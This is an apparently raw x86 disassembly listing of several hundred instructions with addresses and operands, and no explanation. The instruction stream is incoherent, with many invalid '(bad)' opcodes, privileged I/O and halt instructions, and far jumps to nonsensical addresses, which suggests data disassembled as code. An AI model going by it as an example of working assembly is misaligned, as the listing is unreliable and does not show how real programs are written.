  40ef88:	add    eax,0x8b059873
  40ef8d:	xchg   ecx,eax
  40ef8e:	inc    ebp
  40ef8f:	jmp    0xdbf7:0x51829ab2
  40ef96:	es xchg ebp,eax
  40ef98:	fidiv  WORD PTR [eax-0x31]
  40ef9b:	add    BYTE PTR [edx+0x161afb2b],ch
  40efa1:	mov    ch,0x8b
  40efa3:	in     eax,dx
  40efa4:	mov    dl,0x5b
  40efa6:	sar    BYTE PTR [esi-0x26673ff7],1
  40efac:	jbe    0x40efb3
  40efae:	dec    esp
  40efaf:	mov    ebx,esi
  40efb1:	push   0xffffffb7
  40efb3:	icebp  
  40efb4:	sbb    al,BYTE PTR [ebx-0x7dec657c]
  40efba:	hlt    
  40efbb:	sub    BYTE PTR [eax],ch
  40efbd:	xchg   bh,bl
  40efbf:	lods   eax,DWORD PTR ds:[esi]
  40efc0:	sti    
  40efc1:	outs   dx,DWORD PTR ds:[esi]
  40efc2:	cmc    
  40efc3:	pop    ds
  40efc4:	int    0x70
  40efc6:	sar    DWORD PTR [ebx],0x56
  40efc9:	push   esp
  40efca:	or     eax,0x7064d6c7
  40efcf:	inc    edx
  40efd0:	xchg   BYTE PTR ds:0xc904c061,bh
  40efd6:	pop    esp
  40efd7:	in     eax,dx
  40efd8:	inc    ecx
  40efd9:	push   edi
  40efda:	call   0x5cedabf
  40efdf:	cmp    al,0xf4
  40efe1:	xor    bl,0x37
  40efe4:	push   ebx
  40efe5:	clc    
  40efe6:	pop    ds
  40efe7:	cs out 0x3e,eax
  40efea:	xor    eax,0x3febed0f
  40efef:	scas   eax,DWORD PTR es:[edi]
  40eff0:	ds je  0x40f05f
  40eff3:	mov    ebp,0x6578da09
  40eff8:	pushf  
  40eff9:	pop    ss
  40effa:	mov    al,0x85
  40effc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40effd:	mov    ebx,0xfe5f9a91
  40f002:	xor    ch,dh
  40f004:	rcr    DWORD PTR [ebx-0x132e2e84],cl
  40f00a:	adc    al,0x58
  40f00c:	mov    al,ds:0xbe65e7a5
  40f011:	jmp    0xbcc7:0xad1003b3
  40f018:	sti    
  40f019:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f01a:	sub    eax,0x1312f730
  40f01f:	xchg   DWORD PTR [eax],edi
  40f021:	mov    dl,0x6a
  40f023:	inc    DWORD PTR cs:[ecx]
  40f026:	cmp    ebx,DWORD PTR [edx-0x53]
  40f029:	pop    ebp
  40f02a:	out    dx,eax
  40f02b:	jne    0x40f012
  40f02d:	ss xor eax,eax
  40f030:	adc    al,BYTE PTR ds:0xf2dfec7a
  40f036:	sub    ecx,esi
  40f038:	mov    esi,DWORD PTR [ecx]
  40f03a:	rcr    DWORD PTR [eax-0x413f822d],0x1d
  40f041:	mov    eax,ds:0x49dfec6e
  40f046:	sbb    ebx,DWORD PTR [ebx-0x4c4bb5c2]
  40f04c:	js     0x40efd5
  40f04e:	ss mov al,0xd2
  40f051:	lds    edi,FWORD PTR [esi+edi*2+0x5b]
  40f055:	out    0xb2,al
  40f057:	gs je  0x40f027
  40f05a:	and    bh,dh
  40f05c:	in     eax,0x2d
  40f05e:	lea    edx,[esi+0x68]
  40f061:	das    
  40f062:	sahf   
  40f063:	aad    0x1d
  40f065:	add    ch,cl
  40f067:	dec    ebp
  40f068:	lahf   
  40f069:	mov    edx,0xcbc0f785
  40f06e:	jne    0x40f057
  40f070:	sbb    bl,0x3f
  40f073:	sbb    al,0x34
  40f075:	fwait
  40f076:	push   ss
  40f077:	fcomp  DWORD PTR [ebx]
  40f079:	xor    ecx,DWORD PTR [ecx+0x696c979e]
  40f07f:	pop    ebp
  40f080:	mov    al,0x86
  40f082:	inc    edx
  40f083:	mov    cl,0xc1
  40f085:	sbb    esi,DWORD PTR [ecx+0x5]
  40f088:	mov    cl,0x3
  40f08a:	nop
  40f08b:	les    edi,FWORD PTR [ebx-0x7c193963]
  40f091:	out    dx,al
  40f092:	pop    ebp
  40f093:	fbld   TBYTE PTR [ecx]
  40f095:	and    al,0x4c
  40f097:	mov    edx,0x2517dc38
  40f09c:	loopne 0x40f113
  40f09e:	cs inc eax
  40f0a0:	mov    ebp,0x14048325
  40f0a5:	stc    
  40f0a6:	(bad)  [ecx+0x2ad31ddd]
  40f0ac:	dec    edi
  40f0ad:	sub    eax,edi
  40f0af:	xor    eax,ebx
  40f0b1:	push   0xa
  40f0b3:	arpl   bp,cx
  40f0b5:	mov    al,0x28
  40f0b7:	sub    al,0x16
  40f0b9:	dec    ebp
  40f0ba:	xor    eax,0x975e7ea4
  40f0bf:	stos   BYTE PTR es:[edi],al
  40f0c0:	jp     0x40f07a
  40f0c2:	in     eax,dx
  40f0c3:	jmp    0xe002b639
  40f0c8:	dec    edx
  40f0c9:	in     al,0x63
  40f0cb:	or     edx,DWORD PTR [edi+0x1ddc4b19]
  40f0d1:	mov    ds:0x3e803985,eax
  40f0d6:	ret    0xbc1a
  40f0d9:	and    eax,0xc253f4dc
  40f0de:	mov    DWORD PTR [ebx+ebp*1-0x64d3132a],esi
  40f0e5:	dec    esi
  40f0e6:	inc    ebp
  40f0e7:	fsubr  QWORD PTR [edi+0x45]
  40f0ea:	fwait
  40f0eb:	mov    ch,0xd7
  40f0ed:	jge    0x40f081
  40f0ef:	loope  0x40f12f
  40f0f1:	ds dec edi
  40f0f3:	iret   
  40f0f4:	jl     0x40f0d5
  40f0f6:	call   0xdcfb5073
  40f0fb:	cld    
  40f0fc:	jae    0x40f164
  40f0fe:	pop    esi
  40f0ff:	ins    BYTE PTR es:[edi],dx
  40f100:	push   0xffffffae
  40f102:	inc    esi
  40f103:	adc    ch,al
  40f105:	sub    DWORD PTR [esi+0x3b09730a],esp
  40f10b:	lods   eax,DWORD PTR ds:[esi]
  40f10c:	mov    ch,0xc3
  40f10f:	mov    edx,0x72449118
  40f114:	lock adc dh,0x3d
  40f118:	pop    ecx
  40f119:	in     eax,dx
  40f11a:	nop
  40f11b:	rcl    DWORD PTR [esp+ebp*8-0x6108d521],cl
  40f122:	pop    ecx
  40f123:	push   ebx
  40f124:	push   esi
  40f125:	hlt    
  40f126:	pcmpgtb mm6,mm7
  40f129:	mov    BYTE PTR [eax+eiz*8+0x36],cl
  40f12d:	ficom  WORD PTR [esi]
  40f12f:	nop
  40f130:	and    DWORD PTR [ebp+0x38369993],esp
  40f136:	inc    esi
  40f137:	scas   eax,DWORD PTR es:[edi]
  40f138:	adc    esi,DWORD PTR cs:[edi+0x3d1823a0]
  40f13f:	mov    ebx,0xb31dd006
  40f144:	aas    
  40f145:	or     bh,BYTE PTR [ebp+0x7e]
  40f148:	dec    ebp
  40f149:	cld    
  40f14a:	push   esi
  40f14b:	in     al,0x5a
  40f14d:	lahf   
  40f14e:	fwait
  40f14f:	push   edi
  40f150:	mov    eax,0x858097cf
  40f155:	jmp    0x772c:0x26b9d172
  40f15c:	or     eax,0xc83a8a63
  40f161:	push   esp
  40f162:	pusha  
  40f163:	dec    ecx
  40f164:	cmp    edi,DWORD PTR [esi+0x48]
  40f167:	mov    dl,0x5
  40f169:	add    ecx,ebp
  40f16b:	push   esi
  40f16c:	adc    ch,BYTE PTR [edx-0x76]
  40f16f:	jecxz  0x40f11a
  40f171:	and    al,0xb3
  40f173:	inc    ebx
  40f174:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f175:	sub    cl,BYTE PTR [eax]
  40f177:	das    
  40f178:	and    eax,0xb6565087
  40f17d:	push   esi
  40f17e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f17f:	sbb    eax,0xffffffcc
  40f182:	jle    0x40f120
  40f184:	mov    BYTE PTR [edx],0xd2
  40f187:	(bad)  
  40f189:	outs   dx,DWORD PTR ds:[esi]
  40f18a:	xor    DWORD PTR [esp+ebx*4],ebx
  40f18d:	leave  
  40f18e:	or     esp,0xca606fb4
  40f194:	retf   0x3c8
  40f197:	pop    ds
  40f198:	mov    ebx,0x4ac92202
  40f19d:	xchg   esi,eax
  40f19e:	and    ah,0x3f
  40f1a1:	enter  0x223f,0x90
  40f1a5:	jbe    0x40f1b5
  40f1a7:	xchg   ebp,esi
  40f1a9:	in     al,dx
  40f1aa:	imul   BYTE PTR [ebx]
  40f1ac:	sti    
  40f1ad:	out    0x90,eax
  40f1af:	inc    ebx
  40f1b0:	mov    al,0xe0
  40f1b2:	push   edx
  40f1b3:	sbb    esi,esi
  40f1b5:	mov    edx,0x50347987
  40f1ba:	adc    DWORD PTR [esi-0x34],ebx
  40f1bd:	aam    0xa4
  40f1bf:	cmc    
  40f1c0:	iret   
  40f1c1:	out    0x21,al
  40f1c3:	sbb    al,0x52
  40f1c5:	test   al,0x9f
  40f1c7:	xor    BYTE PTR [edx],ah
  40f1c9:	xchg   DWORD PTR [edx],esi
  40f1cb:	(bad)  
  40f1cc:	(bad)  
  40f1cd:	iret   
  40f1ce:	adc    BYTE PTR [ecx+0x71],0x2a
  40f1d2:	shl    BYTE PTR [esi],0xea
  40f1d5:	rcl    BYTE PTR [ecx+0x7c],cl
  40f1d8:	(bad)  
  40f1d9:	into   
  40f1da:	sub    bl,BYTE PTR [edx+edi*1-0x5a293fd9]
  40f1e1:	mov    ebp,ds
  40f1e3:	push   esp
  40f1e4:	inc    ecx
  40f1e5:	jno    0x40f22d
  40f1e7:	mov    ah,0x59
  40f1e9:	mov    ebx,0xca38a694
  40f1ee:	inc    esp
  40f1ef:	hlt    
  40f1f0:	fadd   st,st(5)
  40f1f2:	cmp    BYTE PTR [ebp+0xa7d2a0d],al
  40f1f8:	in     eax,0xe6
  40f1fa:	xor    eax,0xc45f8c1f
  40f1ff:	cmp    ecx,eax
  40f201:	and    eax,DWORD PTR ds:0xd0422a05
  40f207:	or     al,0xaa
  40f209:	ins    DWORD PTR es:[edi],dx
  40f20a:	loope  0x40f208
  40f20c:	pushf  
  40f20d:	sub    BYTE PTR [edx+0x39],cl
  40f210:	aas    
  40f211:	push   ebp
  40f212:	jge    0x40f248
  40f214:	or     dh,BYTE PTR [edx]
  40f216:	add    al,0x65
  40f218:	sbb    ebp,ebp
  40f21a:	xor    dh,0x4d
  40f21d:	jl     0x40f230
  40f21f:	or     BYTE PTR [ebp+ebp*4-0x22ad3a8c],bh
  40f226:	mov    dl,0xc9
  40f228:	xor    bh,al
  40f22a:	xchg   edx,eax
  40f22b:	retf   0x7445
  40f22e:	aam    0x11
  40f230:	mov    bl,0x64
  40f232:	(bad)  [esp+edi*8+0x43f3503b]
  40f239:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f23a:	inc    esp
  40f23b:	jmp    0xcbbafb20
  40f240:	int3   
  40f241:	push   edi
  40f242:	mov    cl,0x90
  40f244:	sahf   
  40f245:	enter  0x34b5,0x53
  40f249:	add    DWORD PTR [ecx-0x78],esi
  40f24c:	(bad)  
  40f24e:	mov    ebp,0xea93a896
  40f253:	outs   dx,BYTE PTR ds:[esi]
  40f254:	push   cs
  40f255:	cvtpi2ps xmm6,QWORD PTR [ebp-0x35]
  40f259:	mov    bh,0xbb
  40f25b:	shl    BYTE PTR [esi+0x37],0x7d
  40f25f:	xchg   edi,eax
  40f260:	xor    al,0xc5
  40f262:	jle    0x40f29b
  40f264:	daa    
  40f265:	ins    DWORD PTR es:[edi],dx
  40f266:	push   esp
  40f267:	dec    ebx
  40f268:	pop    esi
  40f269:	push   ecx
  40f26a:	jae    0x40f227
  40f26c:	mov    BYTE PTR [edx+esi*4-0x1e6d6e9c],cl
  40f273:	mov    dh,0x12
  40f275:	repnz fs xor eax,0xfba160af
  40f27c:	and    DWORD PTR [ecx],0x55
  40f27f:	sub    edi,DWORD PTR [esi+ebx*8+0x72]
  40f283:	jecxz  0x40f237
  40f285:	push   cs
  40f286:	ds aaa 
  40f288:	xchg   edx,eax
  40f289:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f28a:	sbb    al,0x96
  40f28c:	hlt    
  40f28d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f28e:	sub    DWORD PTR [ecx-0x1da366eb],eax
  40f294:	jge    0x40f27d
  40f296:	jmp    0x40f2df
  40f298:	adc    edi,DWORD PTR [ecx]
  40f29a:	jno    0x40f288
  40f29c:	xchg   DWORD PTR [ecx+0x54be89ec],ecx
  40f2a2:	stos   BYTE PTR es:[edi],al
  40f2a3:	inc    BYTE PTR [esi+ebx*4]
  40f2a6:	jmp    0x40f30f
  40f2a8:	jge    0x40f259
  40f2aa:	mov    ss,ebp
  40f2ac:	cmp    al,0x84
  40f2ae:	adc    eax,0x459d9770
  40f2b3:	jno    0x40f2d3
  40f2b5:	mov    ecx,0x732c1039
  40f2ba:	xchg   DWORD PTR [edi],ecx
  40f2bc:	fist   DWORD PTR [ebp-0x56]
  40f2bf:	jno    0x40f2f0
  40f2c1:	jmp    FWORD PTR [edx+eiz*4]
  40f2c4:	pop    esp
  40f2c5:	mov    ch,0xf2
  40f2c7:	clc    
  40f2c8:	lea    eax,[ecx+edx*2+0x17]
  40f2cc:	aaa    
  40f2cd:	ret    0x8497
  40f2d0:	mov    ebx,0xe726999c
  40f2d5:	add    al,0x77
  40f2d7:	xchg   esi,eax
  40f2d8:	adc    al,0xae
  40f2da:	and    eax,0x27cfaf9d
  40f2df:	gs push ebx
  40f2e1:	inc    ecx
  40f2e2:	inc    edi
  40f2e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f2e4:	inc    esi
  40f2e5:	ja     0x40f34c
  40f2e7:	sbb    eax,0x559e4e9a
  40f2ec:	adc    ah,BYTE PTR [eax]
  40f2ee:	push   edi
  40f2ef:	je     0x40f321
  40f2f1:	ds xchg edi,eax
  40f2f3:	popf   
  40f2f4:	pop    ss
  40f2f5:	lods   al,BYTE PTR ds:[esi]
  40f2f6:	mov    bh,0x40
  40f2f8:	retf   
  40f2f9:	sbb    BYTE PTR [eax],ch
  40f2fb:	adc    cl,BYTE PTR gs:[ebx-0x3a]
  40f2ff:	mov    bl,0x26
  40f301:	add    al,0xa7
  40f303:	int    0xc0
  40f305:	mov    ah,0x65
  40f307:	imul   esp,DWORD PTR [edx-0x223721ee],0x7e0386b1
  40f311:	cmp    al,0x52
  40f313:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f314:	xchg   DWORD PTR [ebp+0x51],edx
  40f317:	(bad)  
  40f318:	ror    edi,1
  40f31a:	ja     0x40f2d3
  40f31c:	fs xor ah,cl
  40f31f:	popf   
  40f320:	pop    ebp
  40f321:	cli    
  40f322:	xchg   BYTE PTR [edx-0x59],dl
  40f325:	pmaddwd mm1,QWORD PTR [ebx+0x749dee86]
  40f32c:	and    esi,edi
  40f32e:	leave  
  40f32f:	sar    DWORD PTR [edx],1
  40f331:	cmp    al,0xe8
  40f333:	popa   
  40f334:	push   ecx
  40f335:	pop    ebx
  40f336:	jmp    0xf663ba87
  40f33b:	sar    BYTE PTR [edx+ebp*8-0x63],1
  40f33f:	jbe    0x40f359
  40f341:	ss cmp eax,0x543a4c64
  40f347:	lods   eax,DWORD PTR ds:[esi]
  40f348:	lods   al,BYTE PTR ds:[esi]
  40f349:	mov    ebx,0xec559303
  40f34e:	cmp    DWORD PTR [ecx],esi
  40f350:	leave  
  40f351:	adc    BYTE PTR [edx+0x57],ch
  40f354:	pop    es
  40f355:	test   DWORD PTR [ecx],0xdf6b1e88
  40f35b:	clc    
  40f35c:	ret    
  40f35d:	push   ds
  40f35e:	mov    esp,0xd625d838
  40f363:	lea    esp,[esi+0x2c]
  40f366:	or     BYTE PTR [edx-0x12f2846e],0x92
  40f36d:	jge    0x40f313
  40f36f:	ficom  WORD PTR [ecx-0x773ff997]
  40f376:	bswap  edx
  40f378:	sub    al,BYTE PTR [edx+0x596ba1c1]
  40f37e:	mov    esi,0xd5d05053
  40f383:	mov    sp,sp
  40f386:	push   ss
  40f387:	in     eax,0xdf
  40f389:	dec    edx
  40f38a:	xor    BYTE PTR [ecx+0x64],al
  40f38d:	jo     0x40f403
  40f38f:	pop    ebx
  40f390:	pop    ecx
  40f391:	cmp    dl,BYTE PTR [ecx-0x37]
  40f394:	aas    
  40f395:	dec    edx
  40f396:	add    eax,0x529758f4
  40f39b:	lock enter 0xe7e0,0x2d
  40f3a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f3a1:	dec    ebx
  40f3a2:	punpckhdq mm2,QWORD PTR [edx-0x3b562c3b]
  40f3a9:	jg     0x40f3ec
  40f3ab:	mov    WORD PTR [esi],ds
  40f3ad:	and    ch,ch
  40f3af:	jmp    0xf454:0x34cfc416
  40f3b6:	xchg   DWORD PTR ds:0x8e0db795,esi
  40f3bc:	xchg   DWORD PTR [edx+0x64cd4ba7],edi
  40f3c2:	data16 mov dl,0x22
  40f3c5:	mov    ds:0xa98272f3,eax
  40f3ca:	mov    edi,0x1bc5f85c
  40f3cf:	loop   0x40f44f
  40f3d1:	aam    0x14
  40f3d3:	xor    eax,0xc3a388db
  40f3d8:	cwde   
  40f3d9:	cmc    
  40f3da:	mov    dh,0x3e
  40f3dc:	xlat   BYTE PTR ds:[ebx]
  40f3dd:	add    al,0xe6
  40f3df:	leave  
  40f3e0:	fisttp QWORD PTR [edx]
  40f3e2:	shl    DWORD PTR [eax-0x4d293896],0x47
  40f3e9:	xor    dl,BYTE PTR [edi-0x5a5b79ca]
  40f3ef:	sbb    dh,ch
  40f3f1:	cs scas eax,DWORD PTR es:[edi]
  40f3f3:	ds in  eax,0xfa
  40f3f6:	int    0x1c
  40f3f8:	lods   eax,DWORD PTR ds:[esi]
  40f3f9:	ins    BYTE PTR es:[edi],dx
  40f3fa:	ja     0x40f42b
  40f3fc:	fs in  al,dx
  40f3fe:	push   edi
  40f3ff:	mov    cl,0xaa
  40f401:	stc    
  40f402:	sbb    al,0xb5
  40f404:	and    eax,0x52cb2a4e
  40f409:	pop    ss
  40f40a:	pop    ds
  40f40b:	lahf   
  40f40c:	(bad)  
  40f40d:	or     eax,0x94d76631
  40f412:	jg     0x40f42c
  40f414:	es mov ebx,0xfe49c15b
  40f41a:	add    eax,0x62ee6d3f
  40f41f:	cmp    ah,BYTE PTR [eax+ecx*8+0x56]
  40f423:	les    esp,FWORD PTR [esi+0x1a077f2c]
  40f429:	adc    al,0x3f
  40f42b:	out    0xfc,al
  40f42d:	and    ebx,0x45
  40f430:	add    ecx,DWORD PTR ds:0xc933cf7f
  40f436:	sub    al,0x63
  40f438:	dec    ebp
  40f439:	bound  esp,QWORD PTR [eax+esi*4+0x0]
  40f43d:	nop
  40f43e:	outs   dx,BYTE PTR ds:[esi]
  40f43f:	inc    esp
  40f440:	fidivr WORD PTR [ebp-0x5a7b1073]
  40f446:	xchg   ecx,eax
  40f447:	out    0x45,al
  40f449:	mov    WORD PTR [ebp-0x57ded792],gs
  40f44f:	xor    DWORD PTR [edx-0x31],esp
  40f452:	adc    cl,BYTE PTR [ebx]
  40f454:	mov    bl,0xb8
  40f456:	loop   0x40f4d7
  40f458:	xchg   ebx,eax
  40f459:	lea    edx,[ecx+0x7443e1d3]
  40f45f:	daa    
  40f460:	(bad)  
  40f461:	les    ebx,FWORD PTR [ecx]
  40f463:	sbb    al,0x8c
  40f465:	mov    bl,0xb7
  40f467:	pop    ds
  40f468:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f469:	ficomp DWORD PTR [edi+0x4b]
  40f46c:	push   eax
  40f46d:	in     al,dx
  40f46e:	pop    edx
  40f46f:	or     al,0xf0
  40f471:	push   esp
  40f472:	cmp    esi,edi
  40f474:	pop    esi
  40f475:	adc    esp,DWORD PTR [edx-0x605a89bd]
  40f47b:	xor    BYTE PTR [edx],cl
  40f47d:	in     al,0x6c
  40f47f:	and    cl,BYTE PTR [ecx*4+0x1602da9a]
  40f486:	rcl    DWORD PTR [ebp+ebp*8+0x7fc59acd],0xfc
  40f48e:	fsub   DWORD PTR [ebx-0x4]
  40f491:	in     al,0xd3
  40f493:	lahf   
  40f494:	and    ch,BYTE PTR [eax-0x44425ea0]
  40f49a:	adc    cl,BYTE PTR [edx-0x62e6ccb9]
  40f4a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f4a1:	sar    DWORD PTR [ecx-0x4d],cl
  40f4a4:	pop    esp
  40f4a5:	neg    BYTE PTR [edi+0x77a3bad3]
  40f4ab:	loope  0x40f517
  40f4ad:	lock lods eax,DWORD PTR ds:[esi]
  40f4af:	fmul   DWORD PTR [edi]
  40f4b1:	jo     0x40f461
  40f4b3:	dec    ecx
  40f4b4:	adc    DWORD PTR [ecx],esp
  40f4b6:	test   al,0x8d
  40f4b8:	fs xchg ebp,eax
  40f4ba:	push   es
  40f4bb:	clc    
  40f4bc:	mov    eax,ds:0x230553da
  40f4c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f4c2:	lock add ch,BYTE PTR [edx+0x12]
  40f4c6:	shl    DWORD PTR [edx-0x5b9abbda],cl
  40f4cc:	add    DWORD PTR [edx+0x1ab02674],esp
  40f4d2:	nop
  40f4d3:	jb     0x40f501
  40f4d5:	jns    0x40f48d
  40f4d7:	cmp    BYTE PTR [ebx+0x1d],cl
  40f4da:	xchg   al,bl
  40f4dc:	fcomp  QWORD PTR [eax-0x77]
  40f4df:	mov    BYTE PTR [ecx-0x705fbe36],bl
  40f4e5:	mov    esp,0x39886d8c
  40f4ea:	call   0x7da5:0xf3d70643
  40f4f1:	ret    0x788e
  40f4f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f4f5:	mov    bl,BYTE PTR [edi]
  40f4f7:	cmp    eax,DWORD PTR [edi-0x1fb85794]
  40f4fd:	mov    WORD PTR [edx],gs
  40f4ff:	cld    
  40f500:	and    DWORD PTR ds:0xbd78dc34,0x3e
  40f507:	fs or  al,cl
  40f50a:	and    BYTE PTR [ebx-0x74],ch
  40f50d:	sub    esi,DWORD PTR [edi]
  40f50f:	or     bl,BYTE PTR [esi-0x49]
  40f512:	int3   
  40f513:	mov    ah,0x42
  40f515:	or     al,0x18
  40f517:	test   bh,al
  40f519:	inc    edi
  40f51a:	test   esp,ecx
  40f51c:	push   eax
  40f51d:	loop   0x40f4d1
  40f51f:	ret    
  40f520:	cpuid  
  40f522:	sub    ch,BYTE PTR [ebx+edx*2+0x26]
  40f526:	xchg   esi,eax
  40f527:	mov    esi,0xb19995f9
  40f52c:	push   es
  40f52d:	std    
  40f52e:	sbb    al,BYTE PTR [ecx-0x57]
  40f531:	(bad)  
  40f532:	jo     0x40f591
  40f534:	jne    0x40f4bf
  40f536:	lods   al,BYTE PTR ds:[esi]
  40f537:	pusha  
  40f538:	inc    DWORD PTR [ecx]
  40f53a:	add    DWORD PTR [esi-0x3f9937c],ecx
  40f540:	mov    cl,BYTE PTR [ecx-0x2ba46bb2]
  40f546:	rol    BYTE PTR [edx+0x7e],cl
  40f549:	mov    BYTE PTR [esi+0xd273e6a],0x1c
  40f550:	cmp    eax,0x40cbfbe8
  40f555:	push   edx
  40f556:	popf   
  40f557:	sub    BYTE PTR [edi+0x3ed9390d],dl
  40f55d:	mov    ah,0xf8
  40f55f:	push   eax
  40f560:	test   al,0xb5
  40f562:	mov    eax,ds:0xc1dcf5ef
  40f567:	inc    ecx
  40f568:	add    al,0xdf
  40f56a:	fadd   st,st(2)
  40f56c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f56d:	(bad)  
  40f56e:	jb     0x40f5c2
  40f570:	gs pushf 
  40f572:	mov    ds:0x2b099de6,al
  40f577:	in     al,dx
  40f578:	test   BYTE PTR [ecx+esi*4],ch
  40f57b:	shr    esp,cl
  40f57d:	pop    ebp
  40f57e:	frstor [ebx+esi*8-0x19]
  40f582:	pop    ss
  40f583:	test   eax,0xa645b80a
  40f588:	and    dl,dh
  40f58a:	in     eax,0x16
  40f58c:	fdiv   st,st(0)
  40f58e:	pop    ebx
  40f58f:	mov    edi,ecx
  40f591:	mov    ah,0x5b
  40f593:	dec    edx
  40f594:	add    DWORD PTR [ebx+ecx*2+0x7a046dc5],ebp
  40f59b:	jmp    0x882714fe
  40f5a0:	mov    ds:0xe02503c4,eax
  40f5a5:	xchg   BYTE PTR [ebp+0x4a],ch
  40f5a8:	sub    bl,BYTE PTR [eax-0x6]
  40f5ab:	add    DWORD PTR [ebp+ebp*2+0x33],esi
  40f5af:	aam    0xa7
  40f5b1:	cmp    BYTE PTR [ebx+0x4a],0x1a
  40f5b5:	into   
  40f5b6:	fcomp  st(6)
  40f5b8:	push   cs
  40f5b9:	pop    ss
  40f5ba:	jl     0x40f5b8
  40f5bc:	jbe    0x40f634
  40f5be:	xor    BYTE PTR cs:[ecx],ch
  40f5c1:	hlt    
  40f5c2:	lods   al,BYTE PTR ds:[esi]
  40f5c3:	push   ss
  40f5c4:	popa   
  40f5c5:	mov    ebx,0x43fe6faa
  40f5ca:	cmp    bl,ah
  40f5cc:	lods   eax,DWORD PTR ds:[esi]
  40f5cd:	xchg   ecx,eax
  40f5ce:	fadd   QWORD PTR [esi+eax*1+0x3ce91b1a]
  40f5d5:	out    0xa6,eax
  40f5d7:	ins    BYTE PTR es:[edi],dx
  40f5d8:	xchg   ecx,eax
  40f5d9:	sub    ch,BYTE PTR [edi+0x0]
  40f5dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f5dd:	cmp    DWORD PTR [edi+0xee23f39],esp
  40f5e3:	mov    al,0xd2
  40f5e5:	jl     0x40f5a7
  40f5e7:	fcomp  DWORD PTR [edx-0x70]
  40f5ea:	aam    0x8e
  40f5ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f5ed:	dec    ebp
  40f5ee:	add    ecx,DWORD PTR [edx-0x56]
  40f5f1:	and    DWORD PTR [edx-0x76f7fee1],ecx
  40f5f7:	fs popa 
  40f5f9:	push   ds
  40f5fa:	pop    ss
  40f5fb:	pop    edx
  40f5fc:	sbb    al,cl
  40f5fe:	iret   
  40f5ff:	mov    ebx,0x620ce34c
  40f604:	sub    ebp,edx
  40f606:	xchg   ebp,eax
  40f607:	dec    ebx
  40f608:	in     eax,dx
  40f609:	xchg   ebx,eax
  40f60a:	jge    0x40f67f
  40f60c:	mov    ebx,0x1c6e5040
  40f611:	aam    0xf4
  40f613:	icebp  
  40f614:	fwait
  40f615:	jae    0x40f5f7
  40f617:	jno    0x40f62b
  40f619:	mov    esp,0x7e8594f8
  40f61e:	xchg   edx,eax
  40f61f:	repnz inc eax
  40f622:	or     al,0x62
  40f625:	lds    ebx,FWORD PTR [ebx]
  40f627:	test   DWORD PTR [edx-0x4c46d151],ebp
  40f62d:	imul   ecx,DWORD PTR [ebx-0x45],0x39
  40f631:	xchg   edx,eax
  40f632:	jmp    DWORD PTR [edx]
  40f634:	push   edx
  40f635:	mov    edi,0x883206d0
  40f63a:	push   esi
  40f63b:	sahf   
  40f63c:	push   cs
  40f63d:	lods   eax,DWORD PTR ds:[esi]
  40f63e:	push   esp
  40f63f:	int    0x2d
  40f641:	mov    ebx,DWORD PTR [ebx]
  40f643:	stos   BYTE PTR es:[edi],al
  40f644:	(bad)  
  40f645:	xor    bl,BYTE PTR [ebx+edi*4]
  40f648:	pop    ebx
  40f649:	xlat   BYTE PTR ds:[ebx]
  40f64a:	inc    esp
  40f64b:	fisttp DWORD PTR gs:[edi+0x16f515e5]
  40f652:	icebp  
  40f653:	or     al,0x6b
  40f655:	rcl    edx,0xc
  40f658:	je     0x40f69f
  40f65a:	xchg   ecx,eax
  40f65b:	sbb    al,0x50
  40f65d:	int    0xad
  40f65f:	cmp    al,0xa4
  40f661:	(bad)  
  40f662:	shl    dl,cl
  40f664:	fwait
  40f665:	adc    bh,ah
  40f667:	ds enter 0x299d,0x93
  40f66c:	or     eax,ebx
  40f66e:	pop    ds
  40f66f:	inc    ebx
  40f670:	cmp    esp,DWORD PTR ss:[ecx-0x3647a24e]
  40f677:	fistp  QWORD PTR [edi+0x30d041c1]
  40f67d:	mov    al,BYTE PTR [ecx]
  40f67f:	fmul   DWORD PTR [ebx-0x6f9177a2]
  40f685:	or     eax,0x213cb5da
  40f68a:	stos   DWORD PTR es:[edi],eax
  40f68b:	and    BYTE PTR [ecx-0x21],dl
  40f68e:	int    0x35
  40f690:	sub    BYTE PTR [esi+0x3cc902bc],dh
  40f696:	jl     0x40f69a
  40f698:	mov    ds:0xe7618f61,al
  40f69d:	or     eax,0x65243429
  40f6a2:	or     DWORD PTR [ecx],edx
  40f6a4:	in     eax,0x91
  40f6a6:	xor    esi,DWORD PTR [ebx-0xbf7daf1]
  40f6ac:	push   esp
  40f6ad:	arpl   WORD PTR [ecx],bp
  40f6af:	adc    eax,edx
  40f6b1:	push   ebx
  40f6b2:	(bad)  
  40f6b3:	iret   
  40f6b4:	mov    al,0xa9
  40f6b6:	lods   eax,DWORD PTR ds:[esi]
  40f6b7:	lahf   
  40f6b8:	xchg   edx,eax
  40f6b9:	aaa    
  40f6ba:	(bad)  
  40f6bb:	in     al,dx
  40f6bc:	call   0x25a64afb
  40f6c1:	push   esp
  40f6c2:	popa   
  40f6c3:	sbb    BYTE PTR [ecx+0x1e91b563],bh
  40f6c9:	and    DWORD PTR [esi-0x68],0x14973d86
  40f6d0:	outs   dx,DWORD PTR ds:[esi]
  40f6d1:	mov    ebx,DWORD PTR [ebx]
  40f6d3:	push   0x38b767e
  40f6d8:	jns    0x40f713
  40f6da:	repnz aad 0xf0
  40f6dd:	inc    edi
  40f6de:	outs   dx,DWORD PTR ds:[esi]
  40f6df:	add    eax,esp
  40f6e1:	call   0x4e371bd7
  40f6e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
